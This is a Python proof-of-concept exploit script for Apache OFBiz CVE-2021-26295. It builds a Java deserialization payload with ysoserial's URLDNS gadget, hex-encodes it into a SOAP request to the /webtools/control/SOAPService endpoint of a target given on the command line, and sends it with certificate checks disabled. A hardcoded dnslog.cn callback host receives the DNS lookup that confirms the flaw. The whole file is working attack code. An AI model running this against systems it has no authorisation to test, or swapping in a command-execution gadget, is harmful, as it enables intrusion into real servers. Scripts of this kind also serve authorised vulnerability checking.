import requests
import sys
import subprocess
import binascii
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def trans(s):
    return "%s" % ''.join('%.2x' % x for x in s)

def POC_1(target_url, Dnslog):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "URLDNS", Dnslog], stdout=subprocess.PIPE)
    data = popen.stdout.read()
    hex_data = trans(data)
    headers = {
        'Content-Type': 'text/xml'
    }
    post_data = '''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><peiqi:clearAllEntityCaches xmlns:peiqi="http://ofbiz.apache.org/service/"><peiqi:cus-obj>%s</peiqi:cus-obj></peiqi:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>''' % hex_data
    vuln_url = target_url + "/webtools/control/SOAPService"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5)
        
        if response.status_code == 200:
            print("\033[31m[+] CVE-2021-26295 vulnerability exists \033[0m")
        else:
            print("[x] No CVE-2021-26295 vulnerability")
            sys.exit(0)

    except Exception as e:
        print("[x] No CVE-2021-26295 vulnerability")


if __name__ == '__main__':
    tmpurl = sys.argv[1]    
    target_url = "https://" + tmpurl
    Dnslog = "http://ezb5bm.dnslog.cn"
    POC_1(target_url, Dnslog)